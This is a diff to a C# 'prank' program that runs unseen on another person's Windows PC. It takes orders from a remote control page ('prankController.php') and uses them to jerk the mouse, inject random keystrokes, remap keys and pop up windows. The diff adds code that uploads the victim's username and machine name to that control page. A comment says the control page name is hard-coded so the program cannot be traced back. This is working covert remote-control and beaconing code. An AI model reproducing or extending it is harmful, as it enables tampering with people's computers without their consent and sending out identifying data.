@@ -24,6 +24,7 @@ namespace AprilFools
      * Alt+Shfit+2 Test Button - only runs in test mode
      * 
      * --ideas
+     * move cursor to random corners or locations
      * make noise/tone every hour
      * start odd windows (like ads) - should clear over time or at least limit only 1 persisting to prevent a log in attack
      *  - popup random error mssages for chrome & memmory
@@ -81,9 +82,11 @@ namespace AprilFools
 
         /// <summary>This is the hard coded name of the control page. It is here in the code instead of the cmd line arg so that it cannot be read from the thread and traced back.</summary>
         private const string CTRL_WEB_PAGE_NAME = "prankController.php";
-        private static string ctrlWebPage = null;
+        private const string NEW_CMD_TAG = "_NEW_";
+        private const char CMD_SEPERATION_TAG = '\n';
         private const int externalControlPageFailMaxAttempts = 10;
         private static int externalControlPageFailAttempts = 0;
+        private static string ctrlWebPage = null;
 
         /// <summary>
         /// Entry point for prank application
@@ -135,21 +138,21 @@ namespace AprilFools
             switch (scheduleType)
             {
                 case PrankerSchedule.EasyDay:
-                    plan.Add(PrankerEvent.CreateRandomPopupNow);
-                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
-                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
-                    plan.Add(PrankerEvent.RunEraticMouseThread10s);
+                    plan.Add(PrankerEvent.CreateRandomPopup);
+                    plan.Add(PrankerEvent.RunEraticMouse5s);
+                    plan.Add(PrankerEvent.RunEraticMouse5s);
+                    plan.Add(PrankerEvent.RunEraticMouse10s);
                     plan.Add(PrankerEvent.MapNext5Keys);
                     plan.Add(PrankerEvent.MapNext5Keys);
                     break;
                 case PrankerSchedule.MediumDay:
-                    plan.Add(PrankerEvent.CreateRandomPopupNow);
-                    plan.Add(PrankerEvent.CreateRandomPopupNow);
-                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
-                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
-                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
-                    plan.Add(PrankerEvent.RunEraticMouseThread10s);
-                    plan.Add(PrankerEvent.RunEraticMouseThread10s);
+                    plan.Add(PrankerEvent.CreateRandomPopup);
+                    plan.Add(PrankerEvent.CreateRandomPopup);
+                    plan.Add(PrankerEvent.RunEraticMouse5s);
+                    plan.Add(PrankerEvent.RunEraticMouse5s);
+                    plan.Add(PrankerEvent.RunEraticMouse5s);
+                    plan.Add(PrankerEvent.RunEraticMouse10s);
+                    plan.Add(PrankerEvent.RunEraticMouse10s);
                     plan.Add(PrankerEvent.MapNext5Keys);
                     plan.Add(PrankerEvent.MapNext5Keys);
                     plan.Add(PrankerEvent.MapNext10Keys);
@@ -188,11 +191,8 @@ namespace AprilFools
             }
         }
 
-        const string NEW_CMD_TAG = "_NEW_";
-        const char CMD_SEPERATION_TAG = '\n';
         private static void ReadFromCtrlWebPage()
         {
-            string scheduleTimeStamp = "\n\n as of " + DateTime.Now + " - (Pranking " + (_allPrankingEnabled ? "Enabled" : "Disabled") + ")";
             string downloadUrl = ctrlWebPage + "";
             string html = GenericsClass.DownloadHTML(downloadUrl);
 
@@ -232,7 +232,9 @@ namespace AprilFools
                     foreach (PrankerEvent e in requestedEvents)
                     {
                         if (e == PrankerEvent.CancelAllNewComands) break;
-                        else if (e == PrankerEvent.KillApplication)
+
+                        Console.WriteLine("ReadFromCtrlWebPage() Recieved new Cmd - " + DateTime.Now + " - " + e);
+                        if (e == PrankerEvent.KillApplication)
                         {
                             _applicationRunning = false;
                             break;
@@ -240,7 +242,7 @@ namespace AprilFools
                         else if (e == PrankerEvent.PausePranking)
                         {
                             _allPrankingEnabled = !_allPrankingEnabled;
-                            scheduleTimeStamp = "\n\n as of " + DateTime.Now + " - (Pranking " + (_allPrankingEnabled ? "Enabled" : "Disabled") + ")";
+                            
                         }
                         else
                         {
@@ -251,7 +253,8 @@ namespace AprilFools
 
                 //if schedule changed re-upload current
                 //should always do this to keep page timestamp up to date
-                string uploadUrl = ctrlWebPage + "?upload=Y&uploaddata=" + schedule + scheduleTimeStamp;
+                string timeStamp = "\n\n as of " + DateTime.Now + " on " + Environment.UserName + "/" + Environment.MachineName + " - (Pranking " + (_allPrankingEnabled ? "Enabled" : "Disabled") + ")";
+                string uploadUrl = ctrlWebPage + "?upload=Y&uploaddata=" + schedule + timeStamp;
                 GenericsClass.DownloadHTML(uploadUrl);
             }
             else
@@ -449,7 +452,7 @@ namespace AprilFools
             {
                 if (_allPrankingEnabled && _eraticKeyboardThreadRunning)
                 {
-                    if (GenericsClass._random.Next(100) >= 95)
+                    //if (GenericsClass._random.Next(100) >= 95)
                     {
                         // Generate a random capitol letter
                         char key = (char)(GenericsClass._random.Next(26) + 65);
@@ -463,7 +466,7 @@ namespace AprilFools
                         SendKeys.SendWait(key.ToString());
                     }
                 }
-                Thread.Sleep(GenericsClass._random.Next(500));
+                Thread.Sleep(GenericsClass._random.Next(300,2000));
             }
         }
 
@@ -584,7 +587,7 @@ namespace AprilFools
                 }
                 try
                 {
-                    Thread.Sleep(100);
+                    Thread.Sleep(1000);
                 }
                 catch (ThreadInterruptedException) { }
             }
@@ -598,6 +601,7 @@ namespace AprilFools
 
         public static void ToggleHiddenDesktopIcons()
         {
+            //stub
             //SendKeys.SendWai
         }
 
@@ -783,33 +787,41 @@ namespace AprilFools
                 case PrankerEvent.KillApplication:
                     _applicationRunning = false;
                     break;
-                case PrankerEvent.StartEraticMouseThread:
+                case PrankerEvent.StartEraticMouse:
                     _eraticMouseThreadRunning = true;
                     break;
-                case PrankerEvent.StopEraticMouseThread:
+                case PrankerEvent.StopEraticMouse:
                     _eraticMouseThreadRunning = false;
                     break;
-                case PrankerEvent.RunEraticMouseThread5s:
+                case PrankerEvent.RunEraticMouse5s:
                     _eraticMouseThreadRunning = true;
-                    schedule.AddEvent(PrankerEvent.StopEraticMouseThread, 5 * 1000);
+                    schedule.AddEvent(PrankerEvent.StopEraticMouse, 5 * 1000);
                     break;
-                case PrankerEvent.RunEraticMouseThread10s:
+                case PrankerEvent.RunEraticMouse10s:
                     _eraticMouseThreadRunning = true;
-                    schedule.AddEvent(PrankerEvent.StopEraticMouseThread, 10 * 1000);
+                    schedule.AddEvent(PrankerEvent.StopEraticMouse, 10 * 1000);
                     break;
-                case PrankerEvent.RunEraticMouseThread20s:
+                case PrankerEvent.RunEraticMouse20s:
                     _eraticMouseThreadRunning = true;
-                    schedule.AddEvent(PrankerEvent.StopEraticMouseThread, 20 * 1000);
+                    schedule.AddEvent(PrankerEvent.StopEraticMouse, 20 * 1000);
                     break;
-                case PrankerEvent.StartEraticKeyboardThread:
+                case PrankerEvent.StartEraticKeyboard:
                     _eraticKeyboardThreadRunning = true;
                     break;
-                case PrankerEvent.StopEraticKeyboardThread:
+                case PrankerEvent.StopEraticKeyboard:
                     _eraticKeyboardThreadRunning = false;
                     break;
-                case PrankerEvent.RunEraticKeyboardThread20s:
+                case PrankerEvent.RunEraticKeyboard5s:
                     _eraticKeyboardThreadRunning = true;
-                    schedule.AddEvent(PrankerEvent.StopEraticKeyboardThread, 20 * 1000);
+                    schedule.AddEvent(PrankerEvent.StopEraticKeyboard, 5 * 1000);
+                    break;
+                case PrankerEvent.RunEraticKeyboard10s:
+                    _eraticKeyboardThreadRunning = true;
+                    schedule.AddEvent(PrankerEvent.StopEraticKeyboard, 10 * 1000);
+                    break;
+                case PrankerEvent.RunEraticKeyboard20s:
+                    _eraticKeyboardThreadRunning = true;
+                    schedule.AddEvent(PrankerEvent.StopEraticKeyboard, 20 * 1000);
                     break;
                 case PrankerEvent.StartRandomSoundThread:
                     _randomSoundThreadRunning = true;
@@ -824,7 +836,7 @@ namespace AprilFools
                 case PrankerEvent.PlayBombBeeping:
                     _playBombBeepingNow = true;
                     break;
-                case PrankerEvent.CreateRandomPopupNow:
+                case PrankerEvent.CreateRandomPopup:
                     nextPopup = PrankerPopup.Random;
                     break;
                 case PrankerEvent.StartMappingAllKeys:
@@ -876,16 +888,18 @@ namespace AprilFools
             RebuildSchedule,
 
             //mouse events
-            StartEraticMouseThread,
-            StopEraticMouseThread,
-            RunEraticMouseThread5s,
-            RunEraticMouseThread10s,
-            RunEraticMouseThread20s,
+            StartEraticMouse,
+            StopEraticMouse,
+            RunEraticMouse5s,
+            RunEraticMouse10s,
+            RunEraticMouse20s,
 
             //keyboard events
-            StartEraticKeyboardThread,
-            StopEraticKeyboardThread,
-            RunEraticKeyboardThread20s,
+            StartEraticKeyboard,
+            StopEraticKeyboard,
+            RunEraticKeyboard5s,
+            RunEraticKeyboard10s,
+            RunEraticKeyboard20s,
             StartMappingAllKeys,
             StopMappingAllKeys,
             MapNext5Keys,
@@ -898,7 +912,7 @@ namespace AprilFools
             RunRandomSoundThread20s,
 
             //popup events
-            CreateRandomPopupNow,
+            CreateRandomPopup,
         }
         #endregion
     }
